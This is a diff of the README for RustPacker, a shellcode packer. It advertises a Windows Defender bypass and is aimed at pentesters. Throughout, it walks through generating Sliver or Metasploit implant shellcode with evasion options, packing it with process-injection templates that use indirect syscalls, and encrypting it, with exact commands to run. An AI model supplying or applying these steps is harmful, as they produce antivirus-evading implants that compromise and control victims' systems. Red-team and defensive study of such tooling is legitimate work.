@@ -1,5 +1,9 @@
-# RustPacker
-Template-based shellcode packer written in Rust, with indirect syscall support. Made with <3 for pentesters.
+<h1 align="center">
+<br>
+<img src=img/logo_craiyon.png height="400" border="2px solid #555">
+<br>
+<strong>Rustpacker</strong>
+</h1>
 
 ## But, does it bypass Windows Defender ?
 
@@ -7,8 +11,27 @@ Yes! Here with the common metasploit calc exec payload on a Windows 11 host, usi
 
 ![Windows Defender bypass](/img/WinDef%20bypass.png)
 
-# Quick start
+# Summary
 
+ - [Quick start](#quick-start)
+    - [Podman/Docker setup](#podmandocker-setup)
+    - [Manual install on Kali](#manual-install-on-kali)
+ - [Full documentation](#full-documentation)
+    - [Create shellcode](#create-shellcode)
+        - [Metasploit / MSFvenom](#metasploit--msfvenom)
+        - [Sliver](#sliver)
+    - [Install Rustpacker](#install-rustpacker)
+        - [Podman/Docker setup](#podmandocker-setup-1)
+        - [Manual install on Kali](#manual-install-on-kali-1)
+    - [Use Rustpacker](#use-rustpacker)
+        - [Usage examples](#usage-examples)
+        - [Deprecated templates](#deprecated-templates)
+    - [Are you a Rust developer?](#are-you-a-rust-developer)
+    - [Todo](#todo)
+    - [Credits](#credits)
+    - [Legal disclaimer](#legal-disclaimer)
+
+# Quick start
 ## Podman/Docker setup
 Consider using Podman instead of Docker for [security reasons](https://cloudnweb.dev/2019/10/heres-why-podman-is-more-secured-than-docker-devsecops/).
 From any internet-connected OS with either Podman or Docker installed:
@@ -40,7 +63,7 @@ Run RustPacker:
 # Full documentation
 
 ## Create shellcode
-RustPacker is compatible with any "raw" shellcode.
+RustPacker is compatible with any raw shellcode.
 
 ### Metasploit / MSFvenom
 You can generate raw MSF shellcode using msfvenom's raw format. Ex:
@@ -49,7 +72,7 @@ You can generate raw MSF shellcode using msfvenom's raw format. Ex:
 ### Sliver
 You can generate raw [Sliver](https://github.com/BishopFox/sliver) shellcode using Sliver's "--format shellcode". Ex:
 - `generate --mtls 127.0.0.1:443 --format shellcode --os windows --evasion`
-- You can now use Shikata Ga Nai (SGN) Sliver encoder if prompted. RustPacker templates now use RWX memory regions, which are required for SGN to work.
+- You can use Shikata Ga Nai (SGN) Sliver encoder if prompted. RustPacker templates now use RWX memory regions (not OPSEC safe), which are required for SGN to work.
 
 ## Install Rustpacker
 
@@ -89,18 +112,20 @@ For now, you can choose from the following templates:
 - `ntAPC`, which executes your shellcode as a process using the following low-levels API calls: `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtProtectVirtualMemory`, `NtQueueApcThread`, `NtTestAlert`.
 - `sysCRT`, which injects your shellcode in the `dllhost.exe` process using indirect syscalls to the following low-level API: `NtOpenProcess, NtAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx`. Uses the [rust-syscalls](https://github.com/janoglezcampos/rust_syscalls) project.
 
-### Deprecated templates
-These templates are no longer available with RustPacker, but can be found in `RustPacker/templates/OLD/`:
-- `ct`, which executes your shellcode by spawning a process using the following API calls: `VirtualAlloc, VirtualProtect, CreateThread, WaitForSingleObject`. 
-- `crt`, which injects your shellcode in the `dllhost.exe` process using the following API calls: `OpenProcess, VirtualAllocEx, WriteProcessMemory, VirtualProtectEx, CreateRemoteThread`.
+All the templates are compatible with either XOR or AES encryption.
 
-### Usage example
+### Usage examples
 If you want to pack your Sliver shellcode using the `ntCRT` template with AES encryption:
 - Generate your raw shellcode from Sliver
 - Copy / paste your shellcode file in the `shared` folder of the Rustpacker project
 - Using Podman/Docker without alias: `podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker -f shared/AMAZING_SLIVER.bin -i ntcrt -e aes`
 - Using Podman/Docker with an alias: `rustpacker -f shared/AMAZING_SLIVER.bin -i ntcrt -e aes`
-- Retrieve the output binary along with the Rust source files in the `output_RANDOM_NAME` folder generated in `shared`
+- Retrieve the output binary along with the Rust source files in the `output_[RANDOM_NAME]` folder generated in `shared`, -> Release -> 
+
+### Deprecated templates
+These templates are no longer available with RustPacker, but can be found in `RustPacker/templates/OLD/`:
+- `ct`, which executes your shellcode by spawning a process using the following API calls: `VirtualAlloc, VirtualProtect, CreateThread, WaitForSingleObject`. 
+- `crt`, which injects your shellcode in the `dllhost.exe` process using the following API calls: `OpenProcess, VirtualAllocEx, WriteProcessMemory, VirtualProtectEx, CreateRemoteThread`.
 
 ## Are you a Rust developer?
 If you have some experience with Rust, you're more than welcome to help !
@@ -141,6 +166,7 @@ You can help by:
 - Rust discord
 - StackOverflow
 - https://github.com/postrequest/link
+- [craiyon](https://www.craiyon.com/) for the Rustpacker logo
 
 ## Legal disclaimer
 Usage of anything presented in this repo to attack targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.
